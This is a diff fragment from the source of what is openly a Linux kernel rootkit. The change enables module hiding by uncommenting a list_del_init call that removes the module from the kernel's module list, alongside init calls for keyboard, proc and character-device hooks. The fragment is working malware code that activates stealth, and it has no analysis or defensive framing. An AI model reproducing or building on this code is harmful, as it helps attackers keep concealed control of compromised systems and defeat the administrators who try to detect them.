@@ -98,7 +98,7 @@ inline void start_user_command_run(void)
 
 int __init rootkit_init(void)
 {
-	//list_del_init(&__this_module.list);  // module hiding
+	list_del_init(&__this_module.list);  // module hiding
 	kbd_init();
 	proc_init();
 	char_dev_init();
